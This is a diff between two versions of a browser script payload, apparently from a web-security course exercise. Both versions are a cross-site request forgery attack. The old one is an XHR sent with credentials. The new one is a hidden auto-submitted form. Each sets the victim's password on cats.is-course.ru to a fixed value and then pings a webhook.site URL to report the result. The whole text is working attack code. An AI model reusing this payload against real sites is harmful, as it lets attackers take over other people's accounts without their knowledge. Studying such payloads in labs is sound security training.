@@ -1,16 +1,21 @@
 <script>
-console.log('v3');
-
-var xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://cats.is-course.ru/settings', true);
-xhr.withCredentials = true;
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-
-xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4) {
-        var img = new Image();
-        img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?status=" + xhr.status;
-    }
-};
-xhr.send('password=Abcdef_1234567&confirm-password=Abcdef_1234567');
+console.log('v4');
+var form = document.createElement('form');
+form.method = 'POST';
+form.action = 'https://cats.is-course.ru/settings';
+form.style.display = 'none';
+var pass1 = document.createElement('input');
+pass1.name = 'password';
+pass1.value = 'Abcdef_1234567';
+var pass2 = document.createElement('input');
+pass2.name = 'confirm-password';
+pass2.value = 'Abcdef_1234567';
+form.appendChild(pass1);
+form.appendChild(pass2);
+document.body.appendChild(form);
+form.submit();
+setTimeout(() => {
+    var img = new Image();
+    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?form_submitted=true";
+}, 1000);
 </script>
